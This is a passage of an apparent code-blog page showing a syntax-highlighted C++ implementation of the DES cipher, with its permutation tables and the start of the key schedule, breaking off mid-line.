class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br>bitset&lt;48&gt; subkey[<span class="hljs-number">16</span>];<br><br><span class="hljs-function">bitset&lt;64&gt; <span class="hljs-title">CharsToBitset</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> str[<span class="hljs-number">8</span>])</span></span>;<br><span class="hljs-function">string <span class="hljs-title">BitsetToString</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; bits)</span></span>;<br><span class="hljs-function">bitset&lt;64&gt; <span class="hljs-title">IP</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; &amp;src)</span></span>;<br><span class="hljs-function">bitset&lt;64&gt; <span class="hljs-title">InverseIP</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; &amp;src)</span></span>;<br><span class="hljs-function">bitset&lt;56&gt; <span class="hljs-title">PCOne</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">56</span>&gt; src)</span></span>;<br><span class="hljs-function">bitset&lt;48&gt; <span class="hljs-title">PCTwo</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">56</span>&gt; src)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Subkey</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; key)</span></span>;<br><span class="hljs-function">bitset&lt;28&gt; <span class="hljs-title">leftShift</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">28</span>&gt; temKey, <span class="hljs-type">int</span> r)</span></span>;<br><span class="hljs-function">bitset&lt;32&gt; <span class="hljs-title">f</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">32</span>&gt; right, bitset&lt;<span class="hljs-number">48</span>&gt; subkey)</span></span>;<br><span class="hljs-function">bitset&lt;48&gt; <span class="hljs-title">Expend</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">32</span>&gt; src)</span></span>;<br><span class="hljs-function">bitset&lt;4&gt; <span class="hljs-title">SBox</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">6</span>&gt; tem, <span class="hljs-type">int</span> *sbox)</span></span>;<br><span class="hljs-function">bitset&lt;32&gt; <span class="hljs-title">P</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">32</span>&gt; src)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Decrypt</span><span class="hljs-params">(string &amp;c)</span></span>;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Encrypt</span><span class="hljs-params">(string &amp;c)</span></span>;<br><br><span class="hljs-function">bitset&lt;64&gt; <span class="hljs-title">CharsToBitset</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> str[<span class="hljs-number">8</span>])</span></span><br><span class="hljs-function"></span>&#123;<br>bitset&lt;64&gt; bits;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">8</span>; j++)<br>&#123;<br>bits[i * <span class="hljs-number">8</span> + j] = ((str[i] &gt;&gt; j) &amp; <span class="hljs-number">1</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">return</span> bits;<br>&#125;<br><br><span class="hljs-function">string <span class="hljs-title">BitsetToString</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; bits)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">char</span> ch[<span class="hljs-number">8</span>];<br>bitset&lt;8&gt; e[<span class="hljs-number">8</span>];<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br>e[<span class="hljs-number">0</span>][i] = bits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">8</span>; i &lt; <span class="hljs-number">16</span>; i++)<br>&#123;<br>e[<span class="hljs-number">1</span>][i - <span class="hljs-number">8</span>] = bits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">16</span>; i &lt; <span class="hljs-number">24</span>; i++)<br>&#123;<br>e[<span class="hljs-number">2</span>][i - <span class="hljs-number">16</span>] = bits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">24</span>; i &lt; <span class="hljs-number">32</span>; i++)<br>&#123;<br>e[<span class="hljs-number">3</span>][i - <span class="hljs-number">24</span>] = bits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">32</span>; i &lt; <span class="hljs-number">40</span>; i++)<br>&#123;<br>e[<span class="hljs-number">4</span>][i - <span class="hljs-number">32</span>] = bits[i];<br>;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">40</span>; i &lt; <span class="hljs-number">48</span>; i++)<br>&#123;<br>e[<span class="hljs-number">5</span>][i - <span class="hljs-number">40</span>] = bits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">48</span>; i &lt; <span class="hljs-number">56</span>; i++)<br>&#123;<br>e[<span class="hljs-number">6</span>][i - <span class="hljs-number">48</span>] = bits[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">56</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>&#123;<br>e[<span class="hljs-number">7</span>][i - <span class="hljs-number">56</span>] = bits[i];<br>&#125;<br>string s;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++)<br>&#123;<br><br><span class="hljs-type">int</span> l = e[i].<span class="hljs-built_in">to_ulong</span>();<br>ch[i] = (<span class="hljs-type">char</span>)l;<br>s = s + ch[i];<br>&#125;<br><br><span class="hljs-keyword">return</span> s;<br>&#125;<br><br><span class="hljs-function">bitset&lt;64&gt; <span class="hljs-title">IP</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; &amp;src)</span></span><br><span class="hljs-function"></span>&#123;<br>bitset&lt;64&gt; output;<br><br><span class="hljs-type">int</span> IP_TABLE[] = &#123;<br><span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">42</span>, <span class="hljs-number">34</span>, <span class="hljs-number">26</span>, <span class="hljs-number">18</span>, <span class="hljs-number">10</span>, <span class="hljs-number">2</span>,<br><span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">44</span>, <span class="hljs-number">36</span>, <span class="hljs-number">28</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>,<br><span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">46</span>, <span class="hljs-number">38</span>, <span class="hljs-number">30</span>, <span class="hljs-number">22</span>, <span class="hljs-number">14</span>, <span class="hljs-number">6</span>,<br><span class="hljs-number">64</span>, <span class="hljs-number">56</span>, <span class="hljs-number">48</span>, <span class="hljs-number">40</span>, <span class="hljs-number">32</span>, <span class="hljs-number">24</span>, <span class="hljs-number">16</span>, <span class="hljs-number">8</span>,<br><span class="hljs-number">57</span>, <span class="hljs-number">49</span>, <span class="hljs-number">41</span>, <span class="hljs-number">33</span>, <span class="hljs-number">25</span>, <span class="hljs-number">17</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>,<br><span class="hljs-number">59</span>, <span class="hljs-number">51</span>, <span class="hljs-number">43</span>, <span class="hljs-number">35</span>, <span class="hljs-number">27</span>, <span class="hljs-number">19</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>,<br><span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">45</span>, <span class="hljs-number">37</span>, <span class="hljs-number">29</span>, <span class="hljs-number">21</span>, <span class="hljs-number">13</span>, <span class="hljs-number">5</span>,<br><span class="hljs-number">63</span>, <span class="hljs-number">55</span>, <span class="hljs-number">47</span>, <span class="hljs-number">39</span>, <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">15</span>, <span class="hljs-number">7</span>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>&#123;<br>output[<span class="hljs-number">63</span> - i] = src[<span class="hljs-number">64</span> - IP_TABLE[i]];<br>&#125;<br><br><span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-function">bitset&lt;64&gt; <span class="hljs-title">InverseIP</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; &amp;src)</span></span><br><span class="hljs-function"></span>&#123;<br>bitset&lt;64&gt; output;<br><br><span class="hljs-type">int</span> IIP_TABLE[] = &#123;<br><span class="hljs-number">40</span>, <span class="hljs-number">8</span>, <span class="hljs-number">48</span>, <span class="hljs-number">16</span>, <span class="hljs-number">56</span>, <span class="hljs-number">24</span>, <span class="hljs-number">64</span>, <span class="hljs-number">32</span>,<br><span class="hljs-number">39</span>, <span class="hljs-number">7</span>, <span class="hljs-number">47</span>, <span class="hljs-number">15</span>, <span class="hljs-number">55</span>, <span class="hljs-number">23</span>, <span class="hljs-number">63</span>, <span class="hljs-number">31</span>,<br><span class="hljs-number">38</span>, <span class="hljs-number">6</span>, <span class="hljs-number">46</span>, <span class="hljs-number">14</span>, <span class="hljs-number">54</span>, <span class="hljs-number">22</span>, <span class="hljs-number">62</span>, <span class="hljs-number">30</span>,<br><span class="hljs-number">37</span>, <span class="hljs-number">5</span>, <span class="hljs-number">45</span>, <span class="hljs-number">13</span>, <span class="hljs-number">53</span>, <span class="hljs-number">21</span>, <span class="hljs-number">61</span>, <span class="hljs-number">29</span>,<br><span class="hljs-number">36</span>, <span class="hljs-number">4</span>, <span class="hljs-number">44</span>, <span class="hljs-number">12</span>, <span class="hljs-number">52</span>, <span class="hljs-number">20</span>, <span class="hljs-number">60</span>, <span class="hljs-number">28</span>,<br><span class="hljs-number">35</span>, <span class="hljs-number">3</span>, <span class="hljs-number">43</span>, <span class="hljs-number">11</span>, <span class="hljs-number">51</span>, <span class="hljs-number">19</span>, <span class="hljs-number">59</span>, <span class="hljs-number">27</span>,<br><span class="hljs-number">34</span>, <span class="hljs-number">2</span>, <span class="hljs-number">42</span>, <span class="hljs-number">10</span>, <span class="hljs-number">50</span>, <span class="hljs-number">18</span>, <span class="hljs-number">58</span>, <span class="hljs-number">26</span>,<br><span class="hljs-number">33</span>, <span class="hljs-number">1</span>, <span class="hljs-number">41</span>, <span class="hljs-number">9</span>, <span class="hljs-number">49</span>, <span class="hljs-number">17</span>, <span class="hljs-number">57</span>, <span class="hljs-number">25</span>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i++)<br>&#123;<br>output[<span class="hljs-number">63</span> - i] = src[<span class="hljs-number">64</span> - IIP_TABLE[i]];<br>&#125;<br><br><span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-function">bitset&lt;56&gt; <span class="hljs-title">PCOne</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; src)</span></span><br><span class="hljs-function"></span>&#123;<br>bitset&lt;56&gt; output;<br><br><span class="hljs-type">int</span> PC1_TABLE[] = &#123;<br><span class="hljs-number">57</span>, <span class="hljs-number">49</span>, <span class="hljs-number">41</span>, <span class="hljs-number">33</span>, <span class="hljs-number">25</span>, <span class="hljs-number">17</span>, <span class="hljs-number">9</span>,<br><span class="hljs-number">1</span>, <span class="hljs-number">58</span>, <span class="hljs-number">50</span>, <span class="hljs-number">42</span>, <span class="hljs-number">34</span>, <span class="hljs-number">26</span>, <span class="hljs-number">18</span>,<br><span class="hljs-number">10</span>, <span class="hljs-number">2</span>, <span class="hljs-number">59</span>, <span class="hljs-number">51</span>, <span class="hljs-number">43</span>, <span class="hljs-number">35</span>, <span class="hljs-number">27</span>,<br><span class="hljs-number">19</span>, <span class="hljs-number">11</span>, <span class="hljs-number">3</span>, <span class="hljs-number">60</span>, <span class="hljs-number">52</span>, <span class="hljs-number">44</span>, <span class="hljs-number">36</span>,<br><span class="hljs-number">63</span>, <span class="hljs-number">55</span>, <span class="hljs-number">47</span>, <span class="hljs-number">39</span>, <span class="hljs-number">31</span>, <span class="hljs-number">23</span>, <span class="hljs-number">15</span>,<br><span class="hljs-number">7</span>, <span class="hljs-number">62</span>, <span class="hljs-number">54</span>, <span class="hljs-number">46</span>, <span class="hljs-number">38</span>, <span class="hljs-number">30</span>, <span class="hljs-number">22</span>,<br><span class="hljs-number">14</span>, <span class="hljs-number">6</span>, <span class="hljs-number">61</span>, <span class="hljs-number">53</span>, <span class="hljs-number">45</span>, <span class="hljs-number">37</span>, <span class="hljs-number">29</span>,<br><span class="hljs-number">21</span>, <span class="hljs-number">13</span>, <span class="hljs-number">5</span>, <span class="hljs-number">28</span>, <span class="hljs-number">20</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">56</span>; i++)<br>&#123;<br>output[<span class="hljs-number">55</span> - i] = src[<span class="hljs-number">64</span> - PC1_TABLE[i]];<br>&#125;<br><br><span class="hljs-keyword">return</span> output;<br>&#125;<br><span class="hljs-function">bitset&lt;48&gt; <span class="hljs-title">PCTwo</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">56</span>&gt; src)</span></span><br><span class="hljs-function"></span>&#123;<br>bitset&lt;48&gt; output;<br><br><span class="hljs-type">int</span> PC2_TABLE[] = &#123;<br><span class="hljs-number">14</span>, <span class="hljs-number">17</span>, <span class="hljs-number">11</span>, <span class="hljs-number">24</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>,<br><span class="hljs-number">3</span>, <span class="hljs-number">28</span>, <span class="hljs-number">15</span>, <span class="hljs-number">6</span>, <span class="hljs-number">21</span>, <span class="hljs-number">10</span>,<br><span class="hljs-number">23</span>, <span class="hljs-number">19</span>, <span class="hljs-number">12</span>, <span class="hljs-number">4</span>, <span class="hljs-number">26</span>, <span class="hljs-number">8</span>,<br><span class="hljs-number">16</span>, <span class="hljs-number">7</span>, <span class="hljs-number">27</span>, <span class="hljs-number">20</span>, <span class="hljs-number">13</span>, <span class="hljs-number">2</span>,<br><span class="hljs-number">41</span>, <span class="hljs-number">52</span>, <span class="hljs-number">31</span>, <span class="hljs-number">37</span>, <span class="hljs-number">47</span>, <span class="hljs-number">55</span>,<br><span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">51</span>, <span class="hljs-number">45</span>, <span class="hljs-number">33</span>, <span class="hljs-number">48</span>,<br><span class="hljs-number">44</span>, <span class="hljs-number">49</span>, <span class="hljs-number">39</span>, <span class="hljs-number">56</span>, <span class="hljs-number">34</span>, <span class="hljs-number">53</span>,<br><span class="hljs-number">46</span>, <span class="hljs-number">42</span>, <span class="hljs-number">50</span>, <span class="hljs-number">36</span>, <span class="hljs-number">29</span>, <span class="hljs-number">32</span>&#125;;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">48</span>; i++)<br>&#123;<br>output[<span class="hljs-number">47</span> - i] = src[<span class="hljs-number">56</span> - PC2_TABLE[i]];<br>&#125;<br><br><span class="hljs-keyword">return</span> output;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">Subkey</span><span class="hljs-params">(bitset&lt;<span class="hljs-number">64</span>&gt; key)</span></span><br><span class="hljs-function"></span>&#123;<br>bitset&lt;56&gt; realKey;<br>bitset&lt;28&gt; leftKey;<br>bitset&lt;28&gt; rightKey;<br>bitset&lt;48&gt; compressKey;<br><br><span class="hljs-comment">//PC one</span><br>realKey = <span class="hljs-built_in">PCOne</span>(key);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> r = <span class="hljs-number">0</span>; r &lt; <span class="hljs-number">16</span>; r++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">28</span>; i &lt; <span class="hljs-number">56</span>; i++)<br>&#123;<br>leftKey[i - <span class="hljs-number">28</span>] = realKey[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">28</span>; i++)<br>&#123;<br>rightKey[i] = realKey[i];<br>&#125;<br><br>leftKey = <span class="hljs-built_in">leftShift</span>(leftKey, r);<br>rightKey = <span class="hljs-built_in">leftShift</span>(rightKey, r);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">28</span>; i++)<br>&#123;<br>realKey[i] = rightKey[i];<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">28</span>; i &lt; <span class="hljs-number">56</span>; i++)<br>&#123;<br>realKey[i] = leftKey[i - <span class="hljs-number">28</span>];<br>&#125;<br><br><span class="hljs-comment">//PC two</span><br>compressKey = <span 